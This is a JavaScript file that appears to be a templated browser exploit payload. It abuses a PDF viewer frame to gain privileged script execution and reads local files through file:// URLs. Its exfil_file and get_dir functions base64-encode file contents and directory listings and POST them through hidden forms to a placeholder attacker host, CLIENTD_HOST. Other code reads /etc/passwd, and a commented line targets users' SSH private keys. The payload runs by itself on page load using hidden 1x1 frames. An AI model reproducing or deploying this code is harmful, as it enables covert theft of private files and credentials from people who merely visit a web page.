var start_timeout=2000;
var sandbox_context_i=null;
top_level_window = null;

function replace_pairs(string, replacement_pairs){
    if (replacement_pairs != null){
	for (var i in replacement_pairs){
	    var replacement_pair = replacement_pairs[i];
	    
	    var marker = replacement_pair[0];
	    var replacement = replacement_pair[1];

	    string = string.replace(marker, replacement);
	}
    }

    return string;
}


function get_data(obj){
    var data     = null;
    var contents = obj.document.documentElement.innerHTML;

    try {
	if (contents.indexOf('dirListing') < 0) {
            if (document instanceof XMLDocument) {
		data = new XMLSerializer().serializeToString(document);
            } else {
		var children = document.body.children;
		
		for (var i = 0; i < children.length; i++){
		    var child = children[i];
		    
		    if (child.nodeName.toUpperCase()=='PRE') {
			data = child.textContent;
			break;
		    }
		    
		}
            }
	}
    }
    catch (e){
    }
    
    return data;
}

function receive_message(event){
    console.log(event.data);
}

function start() {
    comm_iframe=document.getElementById("comm_iframe");
    
    console.log('inside of start');
    
    if((typeof run_in_xpcom!=='undefined') && (comm_iframe != null)) {
        clearInterval(intVal);

	var canvas_action = "CANVAS_ACTION";
	var target_path = "TARGET_PATH";

	top_level_window = window;
	console.log("top_level_window.location:" + top_level_window.location);
	// console.log("get_comm_window():" + get_comm_window());
	
	top_level_window.addEventListener("message", receive_message, false);
	
	if (canvas_action == "EXFIL_FILE"){
	    exfil_file(target_path);
	}
	
	else if (canvas_action == "GET_DIRECTORY_LISTING"){
	    if (target_path.indexOf("nathan") > 0){
	    	// alert("downloading " + target_path);
	    }
	    
	    get_dir(target_path);
	}
    }
}

function get_comm_window(){
    var current_window = window[0];
    var found_window = null;
    var window_index = null;
    var i = 0;
    
    while (current_window != null){
    	try {
	    console.log('current_window.location:'  + current_window.location);
	    
	    if (current_window.location == 'view-source:http://CLIENTD_HOST/'){
		found_window = current_window;
		break;
	    }
    	}
    	catch(e) {
    	}
	
    	i++;
    	current_window = window[i];
    }

    console.log('i:' + i);

    return found_window;
}


function get_all_paths(){
    var titles = document.getElementsByTagName('title');
    var tbodies = document.getElementsByTagName('tbody');
    var found_listing = false;

    var paths = [];

    for(var i = 0; i < titles.length; i++){
	var title = titles[i];

	if (title.text.startsWith('Index of')){
	    found_listing = true;
	    // alert('title:'+title.text);
	}
	
    }

    // can also extract modification time and size

    if (found_listing){
	for(var i = 0; i < tbodies.length; i++){
	    var tbody = tbodies[i];

	    var anchors = tbody.getElementsByTagName('a');
	    
	    for (var j = 0; j < anchors.length; j++){
		var anchor = anchors.item(j);

		var anchor_class = anchor.className || 'none';

		if (anchor_class == 'dir' || anchor_class == 'file'){
		    paths.push([anchor.href, anchor_class]);
		}
	    }
	}
    }

    return paths;
    
}



function send_data_post(dest_url, pairs){
    var new_form = document.createElement('form');

    new_form.method='POST';
    new_form.action=dest_url;

    for(var i = 0; i < pairs.length; i++){
    	var name = pairs [i][0];
    	var value = base64(pairs[i][1]);
	
    	var input_field = document.createElement('input');
    	input_field.type='hidden';
    	input_field.name=name;
    	input_field.value=value;

    	new_form.appendChild(input_field);
    }

    document.documentElement.appendChild(new_form);
    
    new_form.submit();

    document.documentElement.removeChild(new_form);
}

function get_dir(dir) {
    get(dir,
	function() {
	    var dir_data = get_all_paths();

	    // console.log('dir_data:' + dir_data);

	    var dir_json = JSON.stringify(dir_data);

	    send_data_post('%destination%',
	    		   [['dir_path', '%target_dir%'],
			    ['session_id', 'SESSION_ID'],
	    		    ['dir_listing', dir_json]]);
			    // ['dir_listing', dir_data.toString()]]);

	    // May be used for exfil later
   	    // comm_iframe.parentNode.remove('comm_iframe');
	    // object.parentNode.remove('object');
 
	}, 500, [["%target_dir%", dir],
		 ["%destination%", 'http://CLIENTD_HOST/']]);
}

function exfil_file(path){
    get(path,
	function() {
            data=get_data(this);
	    
	    send_data_post('%destination%',
			   [['file_path', '%target_dir%'],
			    ['session_id', 'SESSION_ID'],
			    ['file_data',data]]);

	    
   	    // comm_iframe.parentNode.remove('comm_iframe');
	    // object.parentNode.remove('object');
	    
	}, 500, [['%target_dir%', path],
		 ['%destination%', 'http://CLIENTD_HOST/']]);
}

function get_user_dirs(path){
    get("/etc/passwd",
	function() {
            data=get_data(this);

	    var lines = data.split('\n');
	    var user_dirs = [];
    
	    for (var i in lines){
		var line = lines[i];
		var fields = line.split(':');

		if (fields.length == 7){
		    var shell_field = fields[6];
		    var home_field = fields[5];

		    if (home_field.startsWith('/home') && shell_field.endsWith('sh')){
			console.log(home_field + ' has shell:' + shell_field);
			console.log(window.top);
			
			// window.top.push_next_url(home_field + "/.ssh/id_rsa");
		    }
		}
	    }

   	    comm_iframe.parentNode.remove('comm_iframe');
	    object.parentNode.remove('object');

	}, 500, [['%target_dir%', path]]);
    }

function run_code(fun, rpairs){
    var anon_block = fun.toString().replace(/^\s*function\s+\(\s*\)\s*\{/, "\n");

    anon_block = replace_pairs(anon_block, rpairs);
    
    return anon_block.substring(0,anon_block.length-1) + " undefined;\n";
}

function package_code(fun, others, rpairs){
    return replace_pairs(others.reduce(function(prev_code, current_function){
	return prev_code + current_function;
    }, run_code(fun, [])).replace(/\s\/\/.*\n/g,"") + ";undefined", rpairs);
}


function get(path,callback,timeout,rpairs){
    var base64_code = "function base64(string){ var Base64={_keyStr:'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',encode:function(e){var t='';var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t='';var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\\+\\/\\=]/g,'');while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\\r\\n/g,'\\n');var t='';for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t='';var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}; return Base64.encode(string); }";
    
    callback = package_code(callback, [get_all_paths,
				       base64_code,
				       send_data_post,
				       get_data,
				       replace_pairs
				      ],rpairs);

    open_code='javascript:' + run_code(
    	function(){
            try {
    		open("%url%","_self");
            } catch(e) {
    		history.back();
            }}, [["%url%", "file://"+path]]);

    user_callback ='javascript:' + callback;

    run_in_xpcom(
	run_code(function() {
	    comm_iframe.contentWindow.location = window.wrappedJSObject.open_code;
	}, []));
    
    setTimeout((function() {
            run_in_xpcom(run_code(function() {
		comm_iframe.contentWindow.location = window.wrappedJSObject.user_callback;
            }, []));
    }), timeout);
}

function inject_into_xpcom() {
    console.log('inside of inject_into_xpcom');
    
    var current_window = window[0];
    var window_index = null;
    var i = 0;
    
    while (current_window != null){
    	try {
    	    if (current_window.frameElement != null){
    		var frame = current_window.frameElement;
		
    		if (frame.className == "previewPluginContentFrame"){
    		    window_index = i;
		    break;
    		}
    	    }
    	}
    	catch(e) {
    	}
	
    	i++;
    	current_window = window[i];
    }
    
    if (window_index != null){
	var target_window = window[window_index];
    
	clearInterval(sandbox_context_i);

	// var target_iframe = target_window.document.createElement("iframe");
	// target_iframe.onload = function() { eval('window.wrappedJSObject.run_in_xpcom = (function(cmd) { return eval(cmd);})') };
	
	// target_window.frameElement.insertBefore(target_iframe);
	// target_window.document.documentElement.appendChild(target_iframe);

	target_window.frameElement.insertAdjacentHTML('beforebegin',
						      '<iframe onload="' + run_code(function() {
							  window.wrappedJSObject.run_in_xpcom = (function(cmd) {
							      return eval(cmd);
							  });
						      }, []) + '"/>');
    }
    
}

function get_current_window_locs(){
    var current_window = window[0];
    var window_index = null;
    var i = 0;
    var window_locs = {};
    
    while (current_window != null){
	window_locs[current_window.location] = 1;
	
    	i++;
    	current_window = window[i];
    }

    return window_locs;
}

function dump_new_window_locs(prev_window_locs){
    var current_window = window[0];
    var window_index = null;
    var i = 0;
    var window_locs = {};
    
    while (current_window != null){
	var count = prev_window_locs[window.location];
	
	if (count != undefined){
	    count --;
	}
	
    	i++;
    	current_window = window[i];
    }

}

function create_second_iframe(){
    comm_iframe = document.createElement("iframe");
    comm_iframe.id="comm_iframe";
    comm_iframe.src="data:application/pdf,";
    
    comm_iframe.frameBorder=0;
    comm_iframe.width=1;
    comm_iframe.height=1;
    
    document.documentElement.appendChild(comm_iframe);
}

function sandbox_and_view_source() {
    sandbox_context_i = setInterval(inject_into_xpcom, 200);
    object.onload=undefined;
    object.data='view-source:' + location.href;
    return;
}

function create_object(){
    object = document.createElement('object');
    object.data='data:application/pdf,';

    object.style.display='none';
    object.width=1;
    object.height=1;

    object.onload = sandbox_and_view_source;
	
    document.documentElement.appendChild(object);
}

if (navigator.platform.search("Mac") > -1 || navigator.platform.search("Linux") > -1) {
    create_second_iframe();
    create_object();

    // alert("performing action on TARGET_PATH");

    setTimeout(function() {
	intVal = setInterval(start, 150);
    }, start_timeout);
}

setTimeout(function() {
    // location.reload();
    location.replace("http://CLIENTD_HOST/?session_id=SESSION_ID");
    }, EXFIL_TIMEOUT_MSECS);
